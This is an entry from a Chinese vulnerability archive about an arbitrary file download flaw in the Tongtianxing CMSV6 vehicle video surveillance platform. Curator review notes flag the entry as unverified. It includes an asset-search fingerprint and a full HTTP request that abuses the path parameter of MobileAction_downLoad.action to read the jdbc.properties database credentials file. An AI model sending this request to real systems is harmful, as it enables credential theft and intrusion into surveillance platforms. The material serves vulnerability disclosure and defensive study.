---
fofa: ""
source: "wy876 漏洞文库"
product: "通天星 CMSV6 车载视频监控平台"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
fofa_unverified: "web.body="
category_recommendation: "IOT安全/其他设备"
title: "通天星CMSV6车载视频监控平台MobileAction_downLoad存在任意文件下载漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：MobileAction_downLoad,pathwebapproot;JSESSIONIDpresent authnecessityunknown;readablejdbcproperties"
side_effects: "未执行；本文需注意的操作影响：分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。"
source_status: "unknown"
id: "vw-f776b66d00883e94d11460b6"
entity_id: "ve-f776b66d00883e94d11460b6"
schema_version: "1"
---

## 核对与使用边界

- 分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：MobileAction_downLoad,pathwebapproot;JSESSIONIDpresent authnecessityunknown;readablejdbcproperties

- **证据待核（1）**：CMSV6非内容CMS应重归；元fofa误装Hunterweb.body且值残缺。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **凭据与会话边界（2）**：Cookie含会话/平台名称，需脱敏且核无登录是否可用。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **适用与权限边界（3）**：特定WEB-INF文件读支持配置泄漏线索，任意系统文件范围需源码和额外路径证据。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（4）**：无版本/响应正文/修复，语雀来源可回溯。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 通天星CMSV6车载视频监控平台 MobileAction_downLoad存在任意文件下载漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台存在任意文件下载漏洞，攻击者可通过此漏洞下载敏感文件信息，获取数据库账号密码，从而为下一步攻击做准备。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征


# 四、漏洞复现
```plain
GET /808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: language=zh; style=1; EnableAESLogin=0; maintitle=%u5317%u6597%u4E3B%u52A8%u5B89%u5168%u4E91%u5E73%u53F0; name=value; JSESSIONID=91A**************************221
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/af5xnrnru81i15zt>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
